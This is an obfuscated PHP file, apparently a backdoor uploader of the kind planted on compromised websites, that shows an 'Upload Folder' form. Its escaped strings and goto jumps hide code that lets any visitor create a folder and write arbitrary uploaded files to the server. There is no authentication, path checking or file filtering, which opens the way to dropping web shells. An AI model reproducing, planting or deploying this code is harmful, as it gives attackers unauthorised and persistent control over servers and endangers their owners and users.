<?php
 goto om87T; om87T: ?>
<!doctypehtml><html><head><meta charset="UTF-8"><title>Upload Folder</title><link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"rel="stylesheet"></head><body><div class="container mt-5"><form action="#"enctype="multipart/form-data"method="post"><div class="form-group">Folder:<input name="foldername"><br><br></div><div class="form-group">Select Folder to Upload: <input name="files[]"type="file"directory=""id="files"moxdirectory=""multiple webkitdirectory=""><br><br></div><input name="upload"type="Submit"class="btn btn-primary"value="Ярла"></form></div></body></html><?php  goto Bhv68; Bhv68: if (isset($_POST["\x75\x70\x6c\x6f\141\x64"])) { if ($_POST["\x66\x6f\154\x64\x65\162\156\141\x6d\x65"] != '') { $foldername = $_POST["\146\x6f\154\144\x65\x72\x6e\x61\x6d\x65"]; if (!is_dir($foldername)) { mkdir($foldername); } foreach ($_FILES["\x66\151\154\x65\x73"]["\156\141\155\x65"] as $i => $name) { if (strlen($_FILES["\146\x69\x6c\145\x73"]["\156\141\x6d\145"][$i]) > 1) { move_uploaded_file($_FILES["\x66\x69\154\x65\x73"]["\x74\155\x70\x5f\x6e\x61\155\x65"][$i], $foldername . "\57" . $name); } } echo "\x46\x6f\x6c\x64\x65\162\x20\151\163\x20\x73\165\143\143\x65\163\x73\x66\x75\154\x6c\171\40\165\160\x6c\x6f\141\144\145\144"; } else { echo "\x55\160\154\157\141\x64\40\x66\157\x6c\x64\145\162\x20\x6e\x61\155\x65\40\151\x73\x20\145\x6d\160\x74\x79"; } } goto Y9HjR; Y9HjR: ?>